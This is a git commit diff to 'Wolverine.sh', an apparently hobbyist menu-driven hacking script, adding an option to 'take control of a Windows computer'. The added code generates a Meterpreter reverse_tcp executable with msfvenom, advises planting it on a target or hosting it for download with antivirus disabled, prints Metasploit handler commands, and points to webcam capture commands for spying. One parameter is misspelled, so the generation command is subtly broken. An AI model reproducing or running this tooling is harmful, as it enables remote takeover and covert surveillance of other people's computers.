c1d42e17c45230b91b3399236ae5174105ae0e60
Théo <88515240+LeCoqHardi@users.noreply.github.com>
2021-08-20 15:14:54 +0200

    Update Wolverine.sh

--- Wolverine.sh
+++ Wolverine.sh
@@ -31,9 +31,11 @@ echo "8) Hide your MAC Adress with a fake MAC Adress"
 echo ""
 echo "9) Take a Gaming Break"
 echo ""
+echo "10) Take control of a Windows Computer"
+echo ""
 echo "X) Quit Wolverine.sh"
 echo "---------------------------------"
-echo "Enter your choice here (1, 2, 3, 4, 5, 6, 7, 8 or 9 and X to close)"
+echo "Enter your choice here (1, 2, 3, 4, 5, 6, 7, 8, 9 or 10 and X to close)"
 read Reponse
 if [ $Reponse = "1" ]
 then
@@ -134,6 +136,46 @@ then
 	tput setaf 7
 	echo "---------------------------------------------------------------"
 	./Scripts/Games.sh
+elif [ $Reponse = 10 ]
+then
+	echo "Vous voulez prendre le contrôle d'un PC windows..."
+	echo "---------------------------------------------------------------"
+	clear
+	tput setaf 1
+	cat logo
+	tput setaf 7
+	echo "---------------------------------------------------------------"
+	lhost=$(hostname -I | awk '{print $1}')
+	mkdir Executables
+	echo "Your IP address is :" $lhost
+	echo "Which port do you want to use ?"
+	read lport
+	echo "What name do you want to give to the .exe file ? (don't put .exe)"
+	read extension
+	echo "Creating .exe file..."
+	msfvenom -p windows/x64/meterpreter/reverse_tcp lost=$lhost lport=$lport -f exe > $extension.exe
+	mv $extension.exe Executables
+	echo "Once it's done, I advise you to take the .exe file with an USB key or by FTP/SFTP, so you can put it on a Windows Computer, or put it on the Internet to  make it downloadable,
+but, the .exe file is very detectable, so don't forget to disable the antivurus present on the computer."
+	echo ""
+	echo "Once you've finished and launched the .exe on a Windows computer, use those commands on metasploit :"
+	echo ""
+	echo "use exploit/multi/handler"
+	echo ""
+	echo "set payload windows/x64/meterpreter/reverse_tcp"
+	echo ""
+	echo "One that's done, you have to type by yourself the lhost and lport, with the port and ip address that you wrote on the .exe file (port : $lport, ip : $lhost)"
+	echo ""
+	echo "Use this commands :"
+	echo ""
+	echo "set lhost $lhost"
+	echo ""
+	echo "set lport $lport"
+	echo ""
+	echo "Once all of this is done, you just have to lauch the exploit by typing run or exploit and that's it, to take a pic with the webcam, type webcam_snap, and if you want to record the webcam, type webcam_stream, for others commands, type help"
+	echo ""
+	sudo service postgresql start
+	msfconsole -q
 elif [ $Reponse = X ]
 then
 	exit
